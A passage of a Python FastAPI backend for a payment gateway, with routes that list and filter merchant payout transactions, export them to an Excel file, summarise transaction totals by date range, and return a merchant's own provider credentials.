                        db.add(log)
                    else:
                        newlog = PayOutLog(
                            user_id=current_user.id,
                            order_id=wt.order_id,
                            request_payload=json.dumps({"orderid": upstream_order_id}, ensure_ascii=False),
                            response_payload=json.dumps(raw, ensure_ascii=False),
                            status=nested_txt or "success",
                            created_at=datetime.now(india_tz),
                            updated_at=datetime.now(india_tz),
                        )
                        db.add(newlog)

                    db.commit()
                    results.append({"order": wt.order_id, "txn_id": upstream_order_id, "action": "marked_success"})
                except Exception as exc:
                    db.rollback()
                    results.append({"order": wt.order_id, "txn_id": upstream_order_id, "error": f"mark_success_failed: {str(exc)}"})
                continue

    return {"checked": len(results), "results": results}



# GET /wallet-transactions with pagination + filters
@router.get("/wallet-transactions", response_model=Dict[str, Any])
def list_wallet_transactions(
    page: int = Query(1, ge=1),
    per_page: int = Query(20, ge=1, le=200),
    user_id: Optional[str] = Query(None, description="Filter by user_id (admin only)"),
    status: Optional[str] = Query(None, description="status filter (pending, success, failed, InProgress, etc.)"),
    min_amount: Optional[float] = Query(None, description="Minimum amount"),
    max_amount: Optional[float] = Query(None, description="Maximum amount"),
    from_date: Optional[str] = Query(None, description="From created_at (ISO date or YYYY-MM-DD)"),
    to_date: Optional[str] = Query(None, description="To created_at (ISO date or YYYY-MM-DD)"),
    order_id: Optional[str] = Query(None, description="Filter by order_id"),
    txn_id: Optional[str] = Query(None, description="Filter by txn_id"),
    instrument_mode: Optional[str] = Query(None, description="Filter by instrument mode"),
    search: Optional[str] = Query(None, description="Search in order_id, txn_id, description"),
    sort_by: Optional[str] = Query("created_at", description="Sort field: created_at, amount, status, order_id"),
    sort_dir: Optional[str] = Query("desc", description="asc or desc"),
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    """
    List wallet transactions with pagination and filters.
    Non-admin users only see their own transactions. Admins can pass user_id to filter any user.
    """

    # Basic permission: allow user_id filter only for admins
    is_admin = getattr(current_user, "is_admin", False) or getattr(current_user, "role", None) == "admin"

    if user_id and not is_admin:
        raise HTTPException(status_code=403, detail="Only admin can filter by user_id")

    # Build base query
    query = db.query(WalletTransaction).filter(WalletTransaction.transaction_type=="PayOut")
    filters = []

    # Restrict to current user unless admin or user_id provided
    if is_admin:
        if user_id:
            filters.append(WalletTransaction.user_id == user_id)
    else:
        filters.append(WalletTransaction.user_id == current_user.id)


    if status:
        filters.append(WalletTransaction.status == status)

    if order_id:
        filters.append(WalletTransaction.order_id == order_id)

    if txn_id:
        filters.append(WalletTransaction.txn_id == txn_id)

    if instrument_mode:
        filters.append(WalletTransaction.instrument_mode == instrument_mode)

    if min_amount is not None:
        filters.append(WalletTransaction.amount >= float(min_amount))

    if max_amount is not None:
        filters.append(WalletTransaction.amount <= float(max_amount))

    # Date parsing helper (accept YYYY-MM-DD or full ISO)
    def _parse_date(d: str) -> Optional[datetime]:
        if not d:
            return None
        try:
            # Accept 'YYYY-MM-DD' or ISO formats
            if len(d) == 10:
                # treat as date localised to india_tz midnight
                return datetime.fromisoformat(d)
            return datetime.fromisoformat(d)
        except Exception:
            return None

    fd = _parse_date(from_date) if from_date else None
    td = _parse_date(to_date) if to_date else None
    if fd:
        filters.append(WalletTransaction.created_at >= fd)
    if td:
        # include entire day if only date provided; otherwise use provided datetime
        filters.append(WalletTransaction.created_at <= td)

    # Search across order_id / txn_id / description (partial match)
    if search:
        like_term = f"%{search}%"
        filters.append(
            or_(
                WalletTransaction.order_id.ilike(like_term),
                WalletTransaction.txn_id.ilike(like_term),
                WalletTransaction.description.ilike(like_term),
            )
        )

    # Apply filters
    if filters:
        query = query.filter(and_(*filters))

    # Sorting: whitelist allowed fields to prevent SQL injection
    sortable = {
        "created_at": WalletTransaction.created_at,
        "amount": WalletTransaction.amount,
        "status": WalletTransaction.status,
        "order_id": WalletTransaction.order_id,
        "txn_id": WalletTransaction.txn_id,
    }
    sort_col = sortable.get(sort_by, WalletTransaction.created_at)
    if (sort_dir or "").lower() == "asc":
        query = query.order_by(asc(sort_col))
    else:
        query = query.order_by(desc(sort_col))

    # Count total
    try:
        total = query.with_entities(func.count()).scalar() or 0
    except Exception:
        # fallback: load all to count (rare)
        total = query.count()

    # Pagination
    offset = (page - 1) * per_page
    rows = query.offset(offset).limit(per_page).all()

    # Serialize rows to dicts
    def _serialize_row(r: WalletTransaction) -> Dict[str, Any]:
        return {
            "id": r.id,
            "user_id": r.user_id,
            "transaction_type": r.transaction_type,
            "credit_debit": r.credit_debit,
            "order_id": r.order_id,
            "order_token": r.order_token,
            "payIn_mode": r.payIn_mode,
            "status": r.status,
            "customer_id": r.customer_id,
            "amount": float(r.amount) if r.amount is not None else None,
            "settle_amount": float(r.settle_amount) if r.settle_amount is not None else None,
            "balance_amount": float(r.balance_amount) if r.balance_amount is not None else None,
            "charges": float(r.charges) if r.charges is not None else None,
            "gst": float(r.gst) if r.gst is not None else None,
            "reference_id": r.reference_id,
            "txn_id": r.txn_id,
            "description": r.description,
            "instrument_mode": r.instrument_mode,
            "api_name": r.api_name,
            "created_at": r.created_at.isoformat() if r.created_at else None,
            "refund_id": r.refund_id,
        }

    items = [_serialize_row(r) for r in rows]
    total_pages = (total + per_page - 1) // per_page if per_page else 0

    return {
        "items": items,
        "meta": {
            "page": page,
            "per_page": per_page,
            "total": total,
            "total_pages": total_pages,
        },
    }




# add imports at top of file


# beneath your other routes in merchant.py
@router.get("/payouts/export", summary="Export payout transactions as Excel")
def export_payouts_excel(
    from_date: str | None = None,  # accept 'YYYY-MM-DD' or ISO datetime
    to_date: str | None = None,
    status: str | None = None,
    db: Session = Depends(get_db),
    current_user = Depends(user_required),
):
    """
    Export PayOut wallet transactions for the logged-in merchant as an .xlsx file.
    Query params:
      - from_date: YYYY-MM-DD or full ISO timestamp (inclusive)
      - to_date: YYYY-MM-DD or full ISO timestamp (inclusive)
      - status: optional transaction status filter (pending, success, failed, etc.)
    The exported file uses `settle_amount` column as the 'Total amount' in the statement.
    """

    # Helper to parse simple date inputs
    def _parse_date_input(v: str | None) -> datetime | None:
        if not v:
            return None
        v = v.strip()
        try:
            # YYYY-MM-DD -> start of day
            if len(v) == 10 and v[4] == "-" and v[7] == "-":
                return datetime.fromisoformat(f"{v}T00:00:00")
            return datetime.fromisoformat(v)
        except Exception:
            return None

    fd = _parse_date_input(from_date)
    td = _parse_date_input(to_date)
    if fd and (len(from_date) == 10):
        # keep start of day (already 00:00)
        pass
    if td and (to_date and len(to_date) == 10):
        # include whole day: set time to end of day
        td = td + timedelta(days=1) - timedelta(microseconds=1)

    # base query: only payouts belonging to the current merchant
    q = db.query(WalletTransaction).filter(
        WalletTransaction.transaction_type == "PayOut",
        WalletTransaction.user_id == current_user.id
    )
    if status:
        q = q.filter(WalletTransaction.status == status)
    if fd:
        q = q.filter(WalletTransaction.created_at >= fd)
    if td:
        q = q.filter(WalletTransaction.created_at <= td)

    rows = q.order_by(WalletTransaction.created_at.asc()).all()

    # Build list of dicts for pandas
    data = []
    for r in rows:
        data.append({
            "order_id": r.order_id,
            "txn_id": r.txn_id,
            "created_at": (r.created_at.isoformat() if r.created_at else None),
            "status": r.status,
            "amount": float(r.amount) if r.amount is not None else None,
            # settle_amount will be used as the statement total amount per transaction
            "settle_amount": float(r.settle_amount) if getattr(r, "settle_amount", None) is not None else 0.0,
            "charges": float(r.charges) if getattr(r, "charges", None) is not None else 0.0,
            "gst": float(r.gst) if getattr(r, "gst", None) is not None else 0.0,
            "description": getattr(r, "description", None),
            "reference_id": getattr(r, "reference_id", None),
        })

    # Create DataFrame
    df = pd.DataFrame(data, columns=[
        "order_id", "txn_id", "created_at", "status", "amount",
        "settle_amount", "charges", "gst", "description", "reference_id"
    ])

    # Add totals row for settle_amount (and optionally amount/charges)
    total_settle = df["settle_amount"].sum() if not df.empty else 0.0
    total_amount = df["amount"].sum() if not df.empty else 0.0
    total_charges = df["charges"].sum() if not df.empty else 0.0

    # Create a writer and write DataFrame + a totals row at bottom
    buffer = io.BytesIO()
    with pd.ExcelWriter(buffer, engine="openpyxl") as writer:
        df.to_excel(writer, index=False, sheet_name="Payouts")

        # write a small totals sheet or footer row under the table
        totals_df = pd.DataFrame(
            [
                {"label": "TOTAL_SETTLE_AMOUNT", "value": total_settle},
                {"label": "TOTAL_AMOUNT", "value": total_amount},
                {"label": "TOTAL_CHARGES", "value": total_charges},
            ]
        )
        totals_df.to_excel(writer, index=False, sheet_name="Totals")

    buffer.seek(0)

    # prepare filename
    fd_str = fd.date().isoformat() if fd else "start"
    td_str = td.date().isoformat() if td else "end"
    filename = f"payouts_{current_user.id}_{fd_str}_to_{td_str}.xlsx"

    return StreamingResponse(
        buffer,
        media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'}
    )




def _parse_date_iso(d: Optional[str]) -> Optional[date]:
    """Accept YYYY-MM-DD or None. Return date object or None."""
    if not d:
        return None
    try:
        return datetime.fromisoformat(d).date()
    except Exception:
        return None


def _decimal_str(value: Any) -> str:
    d = Decimal(str(value or 0)).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
    return format(d, "f")


@router.get("/merchant/summary", response_model=Dict[str, Any], summary="Merchant transaction summary (by date range)")
def merchant_summary(
    date_from: Optional[str] = Query(None, description="Start date YYYY-MM-DD (inclusive). Defaults to first day of current month."),
    date_to: Optional[str] = Query(None, description="End date YYYY-MM-DD (inclusive). Defaults to last day of current month."),
    status: Optional[str] = Query(None, description="Optional transaction status filter (e.g. success, failed)"),
    db: Session = Depends(get_db),
    current_user = Depends(user_required),
):
    """
    Returns totals for the authenticated merchant:
      - total_txns: integer count of transactions
      - total_volume: sum(amount)
      - total_charges: sum(charges + gst)
    Date comparison is done by calendar date (time ignored). If no dates provided,
    defaults to current calendar month (IST).
    """
    # 1) Resolve merchant id from current_user
    merchant_id = getattr(current_user, "id", None) or getattr(current_user, "user_id", None)
    if not merchant_id:
        raise HTTPException(status_code=400, detail="Cannot resolve merchant id")

    # 2) Determine date range (default = current month in india_tz)
    start_date = _parse_date_iso(date_from)
    end_date = _parse_date_iso(date_to)

    now_local = datetime.now(india_tz).date()

    if not start_date or not end_date:
        # default to month of now_local
        year = now_local.year
        month = now_local.month
        first_day = date(year, month, 1)
        last_day = date(year, month, calendar.monthrange(year, month)[1])
        if not start_date:
            start_date = first_day
        if not end_date:
            end_date = last_day

    # Ensure inclusive ordering
    if start_date > end_date:
        raise HTTPException(status_code=422, detail="date_from must be <= date_to")

    # 3) Build query (NULL-safe for charges/gst)
    q = (
        db.query(
            func.coalesce(func.count(WalletTransaction.id), 0).label("total_txns"),
            func.coalesce(func.sum(WalletTransaction.amount), 0).label("total_volume"),
            func.coalesce(
                func.sum(
                    func.coalesce(WalletTransaction.charges, 0) +
                    func.coalesce(WalletTransaction.gst, 0)
                ),
                0
            ).label("total_charges"),
        )
        .filter(WalletTransaction.user_id == merchant_id)
        .filter(WalletTransaction.transaction_type == "PayOut")
        .filter(WalletTransaction.credit_debit == "debit")
        .filter(func.date(WalletTransaction.created_at) >= start_date)
        .filter(func.date(WalletTransaction.created_at) <= end_date)
    )

    if status:
        q = q.filter(WalletTransaction.status == status)

    row = q.one()

    # 4) Normalize results and return
    total_txns = int(row.total_txns or 0)
    total_volume = _decimal_str(row.total_volume)
    total_charges = _decimal_str(row.total_charges)

    return {
        "merchant_id": merchant_id,
        "date_from": start_date.isoformat(),
        "date_to": end_date.isoformat(),
        "status": status or "any",
        "total_txns": total_txns,
        "total_volume": total_volume,
        "total_charges": total_charges,
    }



@router.get(
    "/credentials",
    response_model=MerchantCredentialsOut
)
def get_my_credentials(
    db: Session = Depends(get_db),
    current_user = Depends(user_required),
):
    merchant_id = current_user.id

    rows = (
        db.query(ProviderCredential)
        .filter(ProviderCredential.merchant_id == merchant_id)
        .all()
    )

    result = []

    for cred in rows:

        # -------- PAYIN ----------
        if cred.is_active_payIn:
            result.append(
                MerchantCredentialItem(
                    provider_id=cred.provider_id,
                    provider_name=cred.provider.name,
                    direction="payin",

                    client_id=cred.client_id,
                    secret_key=cred.secret_key,
                    salt_key1=cred.salt_key1,
                    salt_key2=cred.salt_key2,
                    salt_key3=cred.salt_key3,

                    mid=cred.payIn_mid,
                    is_active=True,
                )
            )

        # -------- PAYOUT ----------
        if cred.is_active_payOut:
            result.append(
                MerchantCredentialItem(
                    provider_id=cred.provider_id,
                    provider_name=cred.provider.name,
                    direction="payout",

                    client_id=cred.client_id,
                    secret_key=cred.secret_key,
                    salt_key1=cred.salt_key1,
                    salt_key2=cred.salt_key2,
                    salt_key3=cred.salt_key3,

                    mid=cred.payOut_mid,
                    is_active=True,
                )
            )

    return MerchantCredentialsOut(
        merchant_id=merchant_id,
        credentials=result
    )
